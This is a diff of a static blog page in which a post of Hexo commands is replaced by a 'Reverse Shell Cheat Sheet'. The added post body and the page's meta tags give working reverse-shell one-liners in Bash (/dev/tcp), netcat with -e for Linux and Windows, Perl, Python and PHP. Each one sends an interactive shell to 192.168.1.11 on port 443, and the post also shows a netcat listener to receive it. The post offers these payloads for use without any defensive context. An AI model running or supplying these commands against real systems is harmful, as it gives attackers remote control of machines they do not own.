@@ -15,18 +15,18 @@
 
 
 
-<meta name="description" content="hexo new &amp;quot;postName&amp;quot; #新建文章 hexo new page &amp;quot;pageName&amp;quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&amp;apos;ctrl + c&amp;apos;关闭server） hexo deploy #将.deploy目录部署到GitHu">
-<meta name="keywords" content="hexo">
+<meta name="description" content="set a listener:  nc -nvlp 443  Bash:  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.11/443 0&amp;gt;&amp;amp;1  Netcat  nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd   ##windows  Per">
+<meta name="keywords" content="python,bash,perl,netcat,php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hexo command">
-<meta property="og:url" content="https://10o0.github.io/2017/03/02/hexo-command/index.html">
+<meta property="og:title" content="Reverse Shell Cheat Sheet">
+<meta property="og:url" content="https://10o0.github.io/2018/01/10/Reverse Shell Cheat Sheet/index.html">
 <meta property="og:site_name" content="0o0o0丶Blog">
-<meta property="og:description" content="hexo new &amp;quot;postName&amp;quot; #新建文章 hexo new page &amp;quot;pageName&amp;quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&amp;apos;ctrl + c&amp;apos;关闭server） hexo deploy #将.deploy目录部署到GitHu">
+<meta property="og:description" content="set a listener:  nc -nvlp 443  Bash:  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.11/443 0&amp;gt;&amp;amp;1  Netcat  nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd   ##windows  Per">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-01-18T04:03:44.205Z">
+<meta property="og:updated_time" content="2018-03-20T06:54:29.556Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hexo command">
-<meta name="twitter:description" content="hexo new &amp;quot;postName&amp;quot; #新建文章 hexo new page &amp;quot;pageName&amp;quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&amp;apos;ctrl + c&amp;apos;关闭server） hexo deploy #将.deploy目录部署到GitHu">
+<meta name="twitter:title" content="Reverse Shell Cheat Sheet">
+<meta name="twitter:description" content="set a listener:  nc -nvlp 443  Bash:  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.11/443 0&amp;gt;&amp;amp;1  Netcat  nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd   ##windows  Per">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -56,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>hexo command | 0o0o0丶Blog</title>
+<title>Reverse Shell Cheat Sheet | 0o0o0丶Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -269,11 +269,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-hexo-command" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Reverse Shell Cheat Sheet" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/02/hexo-command/" class="article-date">
-      <time datetime="2017-03-02T08:46:11.000Z" itemprop="datePublished">2017-03-02</time>
+      <a href="/2018/01/10/Reverse Shell Cheat Sheet/" class="article-date">
+      <time datetime="2018-01-10T01:32:48.000Z" itemprop="datePublished">2018-01-10</time>
 </a>
 
 
@@ -288,7 +288,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      hexo command
+      Reverse Shell Cheat Sheet
     </h1>
   
 
@@ -297,13 +297,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/笔记/">笔记</a>
+    <a class="article-category-link" href="/categories/shell/">shell</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bash/">bash</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/netcat/">netcat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/perl/">perl</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -313,16 +313,32 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <pre><code>hexo new &quot;postName&quot; #新建文章
-hexo new page &quot;pageName&quot; #新建页面
-hexo generate #生成静态页面至public目录
-hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
-hexo deploy #将.deploy目录部署到GitHub
-</code></pre><hr>
-<pre><code>hexo clean
-hexo generate --deploy
-</code></pre><hr>
-<a id="more"></a>
+        <blockquote>
+<p>set a listener:</p>
+</blockquote>
+<pre><code>nc -nvlp 443
+</code></pre><blockquote>
+<p>Bash:</p>
+</blockquote>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1
+</code></pre><blockquote>
+<p>Netcat</p>
+</blockquote>
+<pre><code>nc -nv 192.168.1.11 443 -e /bin/bash ##linux
+nc.exe -nv 192.168.1.11 443 -e cmd   ##windows
+</code></pre><blockquote>
+<p>Perl</p>
+</blockquote>
+<pre><code>perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos;
+</code></pre><blockquote>
+<p>Python</p>
+</blockquote>
+<pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
+</code></pre><blockquote>
+<p>PHP</p>
+</blockquote>
+<pre><code>php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+</code></pre>
       
     </div>
     
@@ -330,13 +346,13 @@ hexo generate --deploy
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/02/hexo-command/">hexo command</a></p>
+        <p><span>本文标题:</span><a href="/2018/01/10/Reverse Shell Cheat Sheet/">Reverse Shell Cheat Sheet</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0o0</a></p>
-        <p><span>发布时间:</span>2017-03-02, 16:46:11</p>
-        <p><span>最后更新:</span>2018-01-18, 12:03:44</p>
+        <p><span>发布时间:</span>2018-01-10, 09:32:48</p>
+        <p><span>最后更新:</span>2018-03-20, 14:54:29</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/02/hexo-command/" title="hexo command">https://10o0.github.io/2017/03/02/hexo-command/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://10o0.github.io/2017/03/02/hexo-command/　　作者: 0o0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/01/10/Reverse Shell Cheat Sheet/" title="Reverse Shell Cheat Sheet">https://10o0.github.io/2018/01/10/Reverse Shell Cheat Sheet/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://10o0.github.io/2018/01/10/Reverse Shell Cheat Sheet/　　作者: 0o0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -349,15 +365,15 @@ hexo generate --deploy
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/03/04/win10-Cmd-here/">
-                    win10-Cmd here
+                <a href="/2018/01/10/kali安装NVIDIA显卡驱动/">
+                    kali安装NVIDIA显卡驱动
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/03/01/mimikittenz-Ps1版/">
-                    mimikittenz-Ps1版
+                <a href="/2017/03/16/s2-045-exp-CVE-2017-5638/">
+                    s2-045 exp CVE-2017-5638
                 </a>
             </div>
         
@@ -400,7 +416,7 @@ hexo generate --deploy
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/04/win10-Cmd-here/" title="上一篇: win10-Cmd here">
+            <a href="/2018/01/10/kali安装NVIDIA显卡驱动/" title="上一篇: kali安装NVIDIA显卡驱动">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -408,7 +424,7 @@ hexo generate --deploy
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/03/01/mimikittenz-Ps1版/" title="下一篇: mimikittenz-Ps1版">
+            <a href="/2017/03/16/s2-045-exp-CVE-2017-5638/" title="下一篇: s2-045 exp CVE-2017-5638">
                 <i class="fa fa-angle-right"></i>
             </a>
         
